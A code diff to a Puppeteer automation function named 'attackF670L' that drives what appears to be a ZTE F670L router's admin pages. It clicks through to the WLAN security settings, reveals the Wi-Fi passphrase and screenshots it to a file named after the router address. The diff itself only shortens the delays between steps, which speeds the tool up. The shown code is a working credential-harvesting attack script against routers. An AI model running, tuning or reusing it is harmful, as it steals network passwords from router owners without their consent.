@@ -15,15 +15,16 @@ export default async function attackF670L(page, endereco) {
         const frame = page.frames()
             .filter(frame => frame.url().includes("template") || frame.url().includes("getpage"))[0]
 
-        await page.waitForTimeout(3000);
+        await page.waitForTimeout(500);
         await frame.click("#mmNet");
 
-        await page.waitForTimeout(3000);
+        await page.waitForTimeout(500);
         await frame.click("#smWLANONE")
 
-        await page.waitForTimeout(3000);
+        await page.waitForTimeout(500);
         await frame.click("#ssmWLANMul1")
 
+        await page.waitForTimeout(500);
         const enderecoUrlFoto = endereco
             .replace("http://", "");
 
@@ -32,13 +33,14 @@ export default async function attackF670L(page, endereco) {
             fullPage: true
         });
 
-        await page.waitForTimeout(3000);
+        await page.waitForTimeout(500);
         await frame.click("#ssmWLANSec1");
 
 
-        await page.waitForTimeout(3000);
+        await page.waitForTimeout(500);
         await frame.click("#Frm_ShowKeyPassphrase");
 
+        await page.waitForTimeout(500);
         await page.screenshot({
             path: `./fotos/${enderecoUrlFoto}-password.png`,
             fullPage: true
